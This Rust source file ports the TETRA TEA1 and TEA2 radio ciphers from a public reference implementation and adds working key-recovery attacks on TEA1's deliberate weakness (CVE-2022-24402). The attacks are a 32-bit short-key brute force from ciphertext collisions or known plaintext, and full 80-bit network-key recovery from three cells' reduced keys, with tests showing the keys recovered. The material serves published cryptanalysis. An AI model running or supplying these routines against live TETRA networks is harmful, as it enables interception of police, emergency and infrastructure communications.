//! The TETRA air interface stream ciphers, TEA1 and TEA2.
//!
//! Ported from Midnight Blue's reference implementation (`TETRA_crypto`,
//! Apache 2.0), the recovered form of the proprietary algorithms. TEA1 is
//! the deliberately weakened one: whatever the network key was, the
//! generator consumes 32 bits folded through a substitution box, which is
//! what makes short-key recovery feasible. TEA2 takes a full 80-bit key.
//!
//! Keystream is generated per slot from the timestamp every encrypted slot
//! carries and the ECK; the caller XORs it against the ciphertext.

/// Where one invocation sits in time: the timestamp every encrypted slot
/// carries, packed the way the IV is (EN 300 392-2 clause 8).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Timestamp {
    /// Timeslot number, 1 to 4.
    pub tn: u8,
    /// Frame number, 1 to 18.
    pub frame: u8,
    /// Multiframe number, 1 to 60.
    pub multiframe: u8,
    /// Hyperframe number; only the low 15 bits reach the IV.
    pub hyperframe: u16,
    /// 0 is downlink, 1 is uplink: keystream in one direction never
    /// decrypts the other.
    pub uplink: bool,
}

impl Timestamp {
    /// The 32-bit initialization value the ciphers are keyed from.
    pub fn iv(&self) -> u32 {
        (u32::from(self.tn.saturating_sub(1)) & 0b11)
            | (u32::from(self.frame) << 2)
            | (u32::from(self.multiframe) << 7)
            | ((u32::from(self.hyperframe) & 0x7fff) << 13)
            | (u32::from(self.uplink) << 28)
    }
}

/// A key in the form the generator consumes.
///
/// TEA1 folds its 80-bit ECK down to 32 bits through a substitution box
/// before use; a recovered short key is already past that fold. TEA2
/// consumes the ECK as it is.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Key {
    /// TEA1, the register after the fold: either a recovered short key or
    /// [`tea1_key_reg`] applied to a full one.
    Tea1(u32),
    /// TEA2, the 80-bit encryption cipher key.
    Tea2([u8; 10]),
}

/// How long a keystream one slot can need: a 268-bit signalling block is
/// 34 bytes; the STEC speech frame fits well inside that.
pub const KS_MAX: usize = 54;

/// A frame whose plaintext over some region is known to equal that of the
/// other frames in a recovery set: the raw ciphertext of that region and the
/// timestamp its keystream is generated from.
///
/// On a voice channel the shared region is a run of speech frames that a
/// silent or held talkgroup encodes identically; on signalling it is a fixed
/// PDU header. The attack does not need to know the plaintext, only that two
/// frames share it (CVE-2022-24402).
#[derive(Clone, Debug)]
pub struct Collision {
    pub ts: Timestamp,
    pub ct: Vec<u8>,
}

/// Search a slice of the 2^32 TEA1 register space for short keys under which
/// every frame in `frames` decrypts to the same plaintext over its region.
///
/// TEA1 folds its 80-bit ECK to 32 bits before the generator runs, so the
/// register is the whole secret and two frames whose plaintext agrees leave
/// about one candidate over the full space; a third frame removes it. The
/// caller owns the loop over `range` so the 2^32 sweep can be split across
/// threads; pass `0..1<<32` to do it whole.
pub fn recover_tea1(frames: &[Collision], range: core::ops::Range<u64>) -> Vec<u32> {
    let mut hits = Vec::new();
    if frames.len() < 2 {
        return hits;
    }
    let len = frames.iter().map(|f| f.ct.len()).min().unwrap_or(0);
    let ivs: Vec<u32> = frames.iter().map(|f| f.ts.iv()).collect();
    'reg: for reg in range {
        let reg = reg as u32;
        let ks0 = tea1(reg, ivs[0], len);
        for (f, iv) in frames.iter().zip(&ivs).skip(1) {
            let ks = tea1(reg, *iv, len);
            for i in 0..len {
                if (f.ct[i] ^ ks[i]) != (frames[0].ct[i] ^ ks0[i]) {
                    continue 'reg;
                }
            }
        }
        hits.push(reg);
    }
    hits
}

/// Search `range` of the register space for short keys under which every
/// frame decrypts to its stated known plaintext: the direct "test the key
/// against the expected payload" check (TETRA:BURST section 5.2). Where a
/// frame's cleartext follows from context, such as a call-setup PDU that
/// precedes the traffic, 32 bits of it pin the register down.
pub fn recover_tea1_known(frames: &[(Timestamp, Vec<u8>, Vec<u8>)], range: core::ops::Range<u64>) -> Vec<u32> {
    let mut hits = Vec::new();
    'reg: for reg in range {
        let reg = reg as u32;
        for (ts, ct, pt) in frames {
            let n = ct.len().min(pt.len());
            let ks = tea1(reg, ts.iv(), n);
            for i in 0..n {
                if ct[i] ^ ks[i] != pt[i] {
                    continue 'reg;
                }
            }
        }
        hits.push(reg);
    }
    hits
}

/// The inverse of the TEA1 fold's sbox, for walking the compression backward.
const TEA1_SBOX_INV: [u8; 256] = {
    let mut inv = [0u8; 256];
    let mut i = 0;
    while i < 256 {
        inv[TEA1_SBOX[i] as usize] = i as u8;
        i += 1;
    }
    inv
};

/// One 80-bit ECK that folds to `reduced`, given the six free key bytes.
///
/// The fold shifts an eight-bit register left by a byte each of ten steps, so
/// after ten the first six bytes are gone and the register is exactly the
/// sbox outputs of the last four steps: those four are the bytes of
/// `reduced`, MSB first, and every choice of the first six bytes yields a
/// distinct pre-image. That is the 2^48 pre-images of TETRA:BURST section
/// 5.2, enumerated by sweeping `free6`.
pub fn tea1_eck_preimage(reduced: u32, free6: &[u8; 6]) -> [u8; 10] {
    let mut reg = 0u32;
    let mut eck = [0u8; 10];
    for (i, &k) in free6.iter().enumerate() {
        let idx = ((reg >> 24) ^ reg ^ u32::from(k)) & 0xff;
        reg = reg.wrapping_shl(8) | u32::from(TEA1_SBOX[idx as usize]);
        eck[i] = k;
    }
    for j in 0..4 {
        let s = ((reduced >> (24 - 8 * j)) & 0xff) as u8;
        let idx = u32::from(TEA1_SBOX_INV[s as usize]);
        eck[6 + j] = ((idx ^ (reg >> 24) ^ reg) & 0xff) as u8;
        reg = reg.wrapping_shl(8) | u32::from(s);
    }
    debug_assert_eq!(reg, reduced);
    eck
}

/// The 80-bit ECK-to-KC mask a cell's public constants imply: `ECK = KC ^
/// mask`, since TB5 xors the constants into the key (see [`eck_from_kc`]).
pub fn tea1_eck_mask(carrier: u16, la: u16, colour: u8) -> [u8; 10] {
    eck_from_kc(&[0u8; 10], carrier, la, colour)
}

/// Recover the full 80-bit network key from reduced ECKs seen on three or
/// more cells or carriers, each `(reduced_eck, carrier, la, colour)`.
///
/// TB5 gives every channel a different ECK from the one key, and it is a xor
/// of public constants, so a candidate key implies each cell's ECK and thus
/// its reduced ECK. The sweep runs over the 2^48 pre-images of the first
/// cell's reduced ECK (the caller owns `range` for threading), turns each
/// into a candidate key with that cell's mask, and keeps the ones that also
/// reproduce every other cell's reduced ECK. Three cells leave one key.
pub fn recover_tea1_full_key(
    obs: &[(u32, u16, u16, u8)],
    range: core::ops::Range<u64>,
) -> Vec<[u8; 10]> {
    let mut out = Vec::new();
    if obs.len() < 2 {
        return out;
    }
    let masks: Vec<[u8; 10]> = obs.iter().map(|o| tea1_eck_mask(o.1, o.2, o.3)).collect();
    for f in range {
        let b = f.to_le_bytes();
        let free6: [u8; 6] = [b[0], b[1], b[2], b[3], b[4], b[5]];
        let eck1 = tea1_eck_preimage(obs[0].0, &free6);
        let mut kc = [0u8; 10];
        for i in 0..10 {
            kc[i] = eck1[i] ^ masks[0][i];
        }
        let ok = obs.iter().zip(&masks).skip(1).all(|(o, m)| {
            let mut eck = [0u8; 10];
            for j in 0..10 {
                eck[j] = kc[j] ^ m[j];
            }
            tea1_key_reg(&eck) == o.0
        });
        if ok {
            out.push(kc);
        }
    }
    out
}

/// Keystream bytes for one slot.
pub fn keystream(key: &Key, ts: &Timestamp, len: usize) -> Vec<u8> {
    match key {
        Key::Tea1(reg) => tea1(*reg, ts.iv(), len),
        Key::Tea2(eck) => tea2(eck, ts.iv(), len),
    }
}

/// The TEA1 key register: the 80-bit ECK folded through the sbox that is
/// the cipher's deliberate weakening (CVE-2022-24402).
///
/// The reference runs this on `int32_t`, so the `>> 24` feeding the sbox
/// index is an arithmetic shift; once the register's top bit sets the
/// sign extension reaches the index and the fold depends on it.
pub fn tea1_key_reg(eck: &[u8; 10]) -> u32 {
    let mut reg = 0i32;
    for &k in eck {
        let idx = ((reg >> 24) ^ i32::from(k) ^ reg) & 0xff;
        reg = reg.wrapping_shl(8) | i32::from(TEA1_SBOX[idx as usize]);
    }
    reg as u32
}

/// The encryption cipher key: what [`Key`] consumes, derived from the
/// network key and the cell's public constants, per TB5 in EN 300 392-7.
pub fn eck_from_kc(kc: &[u8; 10], carrier: u16, la: u16, colour: u8) -> [u8; 10] {
    let cn = u32::from(carrier) & 0xfff;
    let la = u32::from(la) & 0x3fff;
    let cc = u32::from(colour) & 0x3f;
    // The 80-bit mask [ la:14 cn:12 cc:6 cn:12 cc:6 cn:12 cc:6 cn:12 ],
    // worded as 16 + 32 + 32 bits the way the reference words it.
    let m0 = (la << 2) | (cn >> 10);
    let m1 = (cn << 22) | (cc << 16) | (cn << 4) | (cc >> 2);
    let m2 = (cc << 30) | (cn << 18) | (cc << 12) | cn;
    let mut out = [0u8; 10];
    out[..2].copy_from_slice(
        &(u32::from(u16::from_be_bytes([kc[0], kc[1]])) ^ m0).to_be_bytes()[2..4],
    );
    out[2..6].copy_from_slice(
        &(u32::from_be_bytes([kc[2], kc[3], kc[4], kc[5]]) ^ m1).to_be_bytes(),
    );
    out[6..10].copy_from_slice(
        &(u32::from_be_bytes([kc[6], kc[7], kc[8], kc[9]]) ^ m2).to_be_bytes(),
    );
    out
}

fn tea1_expand_iv(iv: u32) -> u64 {
    let xored = (iv ^ 0x9672_4FA1).rotate_left(8);
    ((u64::from(iv) << 32) | u64::from(xored)).rotate_right(8)
}

fn tea1_state_byte(mut st0: u8, mut st1: u8, lut: &[u16; 8]) -> u8 {
    let mut out = 0u8;
    for (i, l) in lut.iter().enumerate() {
        // taps on bit 7,0 for st0 and bit 1,2 for st1
        let dist = ((st0 >> 7) & 1) | ((st0 << 1) & 2) | ((st1 << 1) & 12);
        if l & (1 << dist) != 0 {
            out |= 1 << i;
        }
        st0 = st0.rotate_right(1);
        st1 = st1.rotate_right(1);
    }
    out
}

fn tea1_reorder(b: u8) -> u8 {
    (b << 6) & 0x40
        | (b << 1) & 0x20
        | (b << 2) & 0x08
        | (b >> 3) & 0x14
        | (b >> 2) & 0x01
        | (b >> 5) & 0x02
        | (b << 4) & 0x80
}

fn tea1(key_reg: u32, iv: u32, n: usize) -> Vec<u8> {
    let mut iv_reg = tea1_expand_iv(iv);
    let mut key_reg = key_reg as i32;
    let mut skip = 54usize;
    let mut ks = Vec::with_capacity(n);
    for _ in 0..n {
        for _ in 0..skip {
            let sbox_out = i32::from(TEA1_SBOX[(((key_reg >> 24) ^ key_reg) & 0xff) as usize]);
            key_reg = key_reg.wrapping_shl(8) | sbox_out;

            let w8 = ((iv_reg >> 8) & 0xffff) as u16;
            let deriv12 = tea1_state_byte(w8 as u8, (w8 >> 8) as u8, &TEA1_LUT_A);
            let w40 = ((iv_reg >> 40) & 0xffff) as u16;
            let deriv56 = tea1_state_byte(w40 as u8, (w40 >> 8) as u8, &TEA1_LUT_B);
            let reord4 = tea1_reorder(((iv_reg >> 32) & 0xff) as u8);

            let new_byte = deriv56 ^ ((iv_reg >> 56) as u8) ^ reord4 ^ (sbox_out as u8);
            let mix_byte = deriv12;
            iv_reg = ((iv_reg << 8) ^ (u64::from(mix_byte) << 32)) | u64::from(new_byte);
        }
        ks.push((iv_reg >> 56) as u8);
        skip = 19;
    }
    ks
}

fn tea2_expand_iv(iv: u32) -> u64 {
    let xored = (iv ^ 0x5A6E_3278).rotate_left(8);
    ((u64::from(iv) << 32) | u64::from(xored)).rotate_right(8)
}

fn tea2_state_byte(mut st0: u8, mut st1: u8, lut: &[u16; 8]) -> u8 {
    let mut out = 0u8;
    for (i, l) in lut.iter().enumerate() {
        // taps on bit 0,2 for st0 and bit 0,7 for st1
        let dist = ((st0 >> 1) & 0x1) | ((st0 >> 1) & 0x2) | ((st1 >> 5) & 0x4) | ((st1 << 3) & 0x8);
        if l & (1 << dist) != 0 {
            out |= 1 << i;
        }
        st0 = st0.rotate_right(1);
        st1 = st1.rotate_right(1);
    }
    out
}

fn tea2_reorder(b: u8) -> u8 {
    (b << 6) & 0x40
        | (b << 3) & 0x10
        | (b >> 2) & 0x01
        | (b << 2) & 0x20
        | (b << 3) & 0x80
        | (b >> 4) & 0x02
        | (b >> 3) & 0x08
        | (b >> 5) & 0x04
}

fn tea2(eck: &[u8; 10], iv: u32, n: usize) -> Vec<u8> {
    let mut iv_reg = tea2_expand_iv(iv);
    let mut key = *eck;
    let mut skip = 51usize;
    let mut ks = Vec::with_capacity(n);
    for _ in 0..n {
        for _ in 0..skip {
            let sbox_out = TEA2_SBOX[(key[0] ^ key[7]) as usize];
            key.rotate_left(1);
            key[9] = sbox_out;

            let w0 = (iv_reg & 0xffff) as u16;
            let deriv01 = tea2_state_byte(w0 as u8, (w0 >> 8) as u8, &TEA2_LUT_A);
            let w24 = ((iv_reg >> 24) & 0xffff) as u16;
            let deriv34 = tea2_state_byte(w24 as u8, (w24 >> 8) as u8, &TEA2_LUT_B);
            let reord5 = tea2_reorder(((iv_reg >> 40) & 0xff) as u8);

            let new_byte = ((iv_reg >> 56) as u8)
                ^ ((iv_reg >> 16) as u8)
                ^ reord5
                ^ deriv01
                ^ sbox_out;
            let mix_byte = deriv34;
            iv_reg = ((iv_reg << 8) ^ (u64::from(mix_byte) << 24)) | u64::from(new_byte);
        }
        ks.push((iv_reg >> 56) as u8);
        skip = 19;
    }
    ks
}

pub(crate) const TEA1_SBOX: [u8; 256] = [
    0x9B, 0xF8, 0x3B, 0x72, 0x75, 0x62, 0x88, 0x22, 0xFF, 0xA6, 0x10, 0x4D, 0xA9, 0x97, 0xC3, 0x7B,
    0x9F, 0x78, 0xF3, 0xB6, 0xA0, 0xCC, 0x17, 0xAB, 0x4A, 0x41, 0x8D, 0x89, 0x25, 0x87, 0xD3, 0xE3,
    0xCE, 0x47, 0x35, 0x2C, 0x6D, 0xFC, 0xE7, 0x6A, 0xB8, 0xB7, 0xFA, 0x8B, 0xCD, 0x74, 0xEE, 0x11,
    0x23, 0xDE, 0x39, 0x6C, 0x1E, 0x8E, 0xED, 0x30, 0x73, 0xBE, 0xBB, 0x91, 0xCA, 0x69, 0x60, 0x49,
    0x5F, 0xB9, 0xC0, 0x06, 0x34, 0x2A, 0x63, 0x4B, 0x90, 0x28, 0xAC, 0x50, 0xE4, 0x6F, 0x36, 0xB0,
    0xA4, 0xD2, 0xD4, 0x96, 0xD5, 0xC9, 0x66, 0x45, 0xC5, 0x55, 0xDD, 0xB2, 0xA1, 0xA8, 0xBF, 0x37,
    0x32, 0x2B, 0x3E, 0xB5, 0x5C, 0x54, 0x67, 0x92, 0x56, 0x4C, 0x20, 0x6B, 0x42, 0x9D, 0xA7, 0x58,
    0x0E, 0x52, 0x68, 0x95, 0x09, 0x7F, 0x59, 0x9C, 0x65, 0xB1, 0x64, 0x5E, 0x4F, 0xBA, 0x81, 0x1C,
    0xC2, 0x0C, 0x02, 0xB4, 0x31, 0x5B, 0xFD, 0x1D, 0x0A, 0xC8, 0x19, 0x8F, 0x83, 0x8A, 0xCF, 0x33,
    0x9E, 0x3A, 0x80, 0xF2, 0xF9, 0x76, 0x26, 0x44, 0xF1, 0xE2, 0xC4, 0xF5, 0xD6, 0x51, 0x46, 0x07,
    0x14, 0x61, 0xF4, 0xC1, 0x24, 0x7A, 0x94, 0x27, 0x00, 0xFB, 0x04, 0xDF, 0x1F, 0x93, 0x71, 0x53,
    0xEA, 0xD8, 0xBD, 0x3D, 0xD0, 0x79, 0xE6, 0x7E, 0x4E, 0x9A, 0xD7, 0x98, 0x1B, 0x05, 0xAE, 0x03,
    0xC7, 0xBC, 0x86, 0xDB, 0x84, 0xE8, 0xD1, 0xF7, 0x16, 0x21, 0x6E, 0xE5, 0xCB, 0xA3, 0x1A, 0xEC,
    0xA2, 0x7D, 0x18, 0x85, 0x48, 0xDA, 0xAA, 0xF0, 0x08, 0xC6, 0x40, 0xAD, 0x57, 0x0D, 0x29, 0x82,
    0x7C, 0xE9, 0x8C, 0xFE, 0xDC, 0x0F, 0x2D, 0x3C, 0x2E, 0xF6, 0x15, 0x2F, 0xAF, 0xE1, 0xEB, 0x3F,
    0x99, 0x43, 0x13, 0x0B, 0xE0, 0xA5, 0x12, 0x77, 0x5D, 0xB3, 0x38, 0xD9, 0xEF, 0x5A, 0x01, 0x70,
];

pub(crate) const TEA1_LUT_A: [u16; 8] = [0xDA86, 0x85E9, 0x29B5, 0x2BC6, 0x8C6B, 0x974C, 0xC671, 0x93E2];
pub(crate) const TEA1_LUT_B: [u16; 8] = [0x85D6, 0x791A, 0xE985, 0xC671, 0x2B9C, 0xEC92, 0xC62B, 0x9C47];

const TEA2_SBOX: [u8; 256] = [
    0x62, 0xDA, 0xFD, 0xB6, 0xBB, 0x9C, 0xD8, 0x2A, 0xAB, 0x28, 0x6E, 0x42, 0xE7, 0x1C, 0x78, 0x9E,
    0xFC, 0xCA, 0x81, 0x8E, 0x32, 0x3B, 0xB4, 0xEF, 0x9F, 0x8B, 0xDB, 0x94, 0x0F, 0x9A, 0xA2, 0x96,
    0x1B, 0x7A, 0xFF, 0xAA, 0xC5, 0xD6, 0xBC, 0x24, 0xDF, 0x44, 0x03, 0x09, 0x0B, 0x57, 0x90, 0xBA,
    0x7F, 0x1F, 0xCF, 0x71, 0x98, 0x07, 0xF8, 0xA1, 0x60, 0xF7, 0x52, 0x8D, 0xE5, 0xD7, 0x69, 0x87,
    0x14, 0xED, 0x92, 0xEB, 0xB3, 0x2F, 0xE9, 0x3D, 0xC6, 0x50, 0x5A, 0xA7, 0x45, 0x18, 0x11, 0xC4,
    0xCE, 0xAC, 0xF4, 0x1D, 0x82, 0x54, 0x3E, 0x49, 0xD5, 0xEE, 0x84, 0x35, 0x41, 0x3A, 0xEC, 0x34,
    0x17, 0xE0, 0xC9, 0xFE, 0xE8, 0xCB, 0xE6, 0xAE, 0x68, 0xE2, 0x6B, 0x46, 0xC8, 0x47, 0xB2, 0xE3,
    0x97, 0x10, 0x0E, 0xB8, 0x76, 0x5B, 0xBE, 0xF5, 0xA6, 0x3C, 0x8F, 0xF6, 0xD1, 0xAF, 0xC0, 0x5E,
    0x7E, 0xCD, 0x7C, 0x51, 0x6D, 0x74, 0x2C, 0x16, 0xF2, 0xA5, 0x65, 0x64, 0x58, 0x72, 0x1E, 0xF1,
    0x04, 0xA8, 0x13, 0x53, 0x31, 0xB1, 0x20, 0xD3, 0x75, 0x5F, 0xA4, 0x56, 0x06, 0x8A, 0x8C, 0xD9,
    0x70, 0x12, 0x29, 0x61, 0x4F, 0x4C, 0x15, 0x05, 0xD2, 0xBD, 0x7D, 0x9B, 0x99, 0x83, 0x2B, 0x25,
    0xD0, 0x23, 0x48, 0x3F, 0xB0, 0x2E, 0x0D, 0x0C, 0xC7, 0xCC, 0xB7, 0x5C, 0xF0, 0xBF, 0x2D, 0x4E,
    0x40, 0x39, 0x9D, 0x21, 0x37, 0x77, 0x73, 0x4B, 0x4D, 0x5D, 0xFA, 0xDE, 0x00, 0x80, 0x85, 0x6F,
    0x22, 0x91, 0xDC, 0x26, 0x38, 0xE4, 0x4A, 0x79, 0x6A, 0x67, 0x93, 0xF3, 0xFB, 0x19, 0xA0, 0x7B,
    0xF9, 0x95, 0x89, 0x66, 0xB9, 0xD4, 0xC1, 0xDD, 0x63, 0x33, 0xE1, 0xC3, 0xB5, 0xA3, 0xC2, 0x27,
    0x0A, 0x88, 0xA9, 0x1A, 0x6C, 0x43, 0xEA, 0xAD, 0x30, 0x86, 0x36, 0x59, 0x08, 0x55, 0x01, 0x02,
];

const TEA2_LUT_A: [u16; 8] = [0x2579, 0x86E5, 0xB6C8, 0x31D6, 0x7394, 0x934D, 0x638E, 0xC68B];
const TEA2_LUT_B: [u16; 8] = [0xD68A, 0x97A1, 0xB2C9, 0x239E, 0x9C71, 0x36E8, 0xC9B2, 0x6CD1];

#[cfg(test)]
mod tests {
    use super::*;

    fn hex(s: &str) -> Vec<u8> {
        (0..s.len()).step_by(2).map(|i| u8::from_str_radix(&s[i..i + 2], 16).unwrap()).collect()
    }

    /// The reference implementation's own vectors (TETRA_crypto tests.c).
    #[test]
    fn keystream_matches_the_reference() {
        let ts = |iv: u32, uplink: bool| Timestamp {
            tn: ((iv & 3) + 1) as u8,
            frame: ((iv >> 2) & 0x1f) as u8,
            multiframe: ((iv >> 7) & 0x3f) as u8,
            hyperframe: ((iv >> 13) & 0x7fff) as u16,
            uplink,
        };
        // TEA1: the generator consumes the folded register, so the
        // reference's 10-byte key goes through the fold first.
        let reg = tea1_key_reg(&hex("00000000000000000000").try_into().unwrap());
        assert_eq!(tea1(reg, 0x1111_1111, 10), hex("d33fd8a605a0a1bb9023"));
        let reg = tea1_key_reg(&hex("A79839E4BA88EE54A029").try_into().unwrap());
        assert_eq!(tea1(reg, 0x0123_4567, 10), hex("1dec9c7ec6223d87c2cc"));
        // TEA2 takes the ECK as it is.
        // The reference's vector carries the direction bit set in its IV.
        let ts2 = ts(0x1234_5678, true);
        assert_eq!(
            keystream(&Key::Tea2([0; 10].try_into().unwrap()), &ts2, 10),
            hex("A79839E4BA88EE54A029")
        );
        assert_eq!(
            keystream(&Key::Tea2(hex("112233445566778899AA").try_into().unwrap()), &ts2, 10),
            hex("64704EA9D7DC25608139")
        );
    }

    /// The ECK derivation, checked against the reference's tb5 vectors.
    #[test]
    fn eck_derivation_matches_the_reference() {
        for (cn, la, cc, kc, eck) in [
            ("02BC", "1DCC", "05", "0123456789ABCDEFAABB", "7613EA62A26A871FF807"),
            ("0DE8", "3AF0", "16", "BDF8E8D47CA2EDAE0CFB", "563B92C2A2275A0F6113"),
            ("0DF7", "29E2", "22", "8A41C56175BFBE356891", "2DCAB883AAC709EB4566"),
            ("0757", "082E", "3F", "BA3E0696E83D16608989", "9A87D3699D42CB3F7EDE"),
        ] {
            let kc: [u8; 10] = hex(kc).try_into().unwrap();
            let got = eck_from_kc(
                &kc,
                u16::from_str_radix(cn, 16).unwrap(),
                u16::from_str_radix(la, 16).unwrap(),
                u8::from_str_radix(cc, 16).unwrap(),
            );
            assert_eq!(got.to_vec(), hex(eck), "cn {cn} la {la} cc {cc}");
        }
    }

    /// The teatime crack vector, recovered by searching a window that
    /// contains the reference key 0x111. The full attack sweeps 0..1<<32;
    /// the window keeps the test quick while running the real search.
    #[test]
    fn short_key_recovery_finds_the_reference_key() {
        let ts = |frame| Timestamp { tn: 1, frame, multiframe: 30, hyperframe: 110, uplink: false };
        let frames = vec![
            Collision { ts: ts(6), ct: hex("151ef027") },
            Collision { ts: ts(7), ct: hex("4d00159e") },
        ];
        let hits = recover_tea1(&frames, 0x0000..0x1_0000);
        assert!(hits.contains(&0x111), "the reference key is recovered: {hits:x?}");
        // A third frame with the same plaintext would leave only 0x111; over
        // this small window the pair alone already pins it.
        assert_eq!(hits, vec![0x111], "no other candidate in the window");
    }

    /// Testing a key against an expected payload: known plaintext pins the
    /// register directly, no collision needed.
    #[test]
    fn known_plaintext_recovers_the_key() {
        let ts = Timestamp { tn: 1, frame: 6, multiframe: 30, hyperframe: 110, uplink: false };
        // Encrypt a known 5-byte payload under key 0x00000111.
        let pt = hex("1122334455");
        let ks = tea1(0x111, ts.iv(), pt.len());
        let ct: Vec<u8> = pt.iter().zip(&ks).map(|(p, k)| p ^ k).collect();
        let hits = recover_tea1_known(&[(ts, ct, pt)], 0x0000..0x1_0000);
        assert_eq!(hits, vec![0x111]);
    }

    /// The pre-image enumeration is exact: every candidate folds back to the
    /// reduced ECK it was built for.
    #[test]
    fn eck_preimages_fold_back() {
        let reduced = tea1_key_reg(&hex("A79839E4BA88EE54A029").try_into().unwrap());
        for f in [0u64, 1, 0x1234, 0xffff, 0x00ab_cdef] {
            let b = f.to_le_bytes();
            let free6 = [b[0], b[1], b[2], b[3], b[4], b[5]];
            let eck = tea1_eck_preimage(reduced, &free6);
            assert_eq!(tea1_key_reg(&eck), reduced);
            assert_eq!(&eck[..6], &free6, "the free bytes are the first six");
        }
    }

    /// Full 80-bit key recovery from reduced ECKs on three cells. The sweep
    /// runs a window around the true free bytes; the full attack is 0..1<<48.
    #[test]
    fn full_key_recovery_from_three_cells() {
        let kc: [u8; 10] = hex("0123456789ABCDEFAABB").try_into().unwrap();
        let cells = [(0x02bcu16, 0x1dccu16, 0x05u8), (0x0de8, 0x3af0, 0x16), (0x0df7, 0x29e2, 0x22)];
        let obs: Vec<(u32, u16, u16, u8)> = cells
            .iter()
            .map(|&(cn, la, cc)| (tea1_key_reg(&eck_from_kc(&kc, cn, la, cc)), cn, la, cc))
            .collect();
        // The true free bytes are the first six of cell 0's ECK.
        let eck0 = eck_from_kc(&kc, cells[0].0, cells[0].1, cells[0].2);
        let true_free = u64::from_le_bytes([
            eck0[0], eck0[1], eck0[2], eck0[3], eck0[4], eck0[5], 0, 0,
        ]);
        let keys = recover_tea1_full_key(&obs, true_free - 3..true_free + 4);
        assert_eq!(keys, vec![kc], "the one key that fits all three cells");
    }

    /// The IV packing puts a timestamp where the ciphers expect it.
    #[test]
    fn the_iv_packs_the_timestamp() {
        // The reference's example: hn 110 mn 30 fn 6 tn 1 downlink.
        let ts = Timestamp { tn: 1, frame: 6, multiframe: 30, hyperframe: 110, uplink: false };
        assert_eq!(ts.iv(), (110 << 13) | (30 << 7) | (6 << 2) | 0);
        let ts = Timestamp { tn: 4, frame: 18, multiframe: 60, hyperframe: 0x7fff, uplink: true };
        assert_eq!(ts.iv(), 0x1fff_fe4b);
    }
}


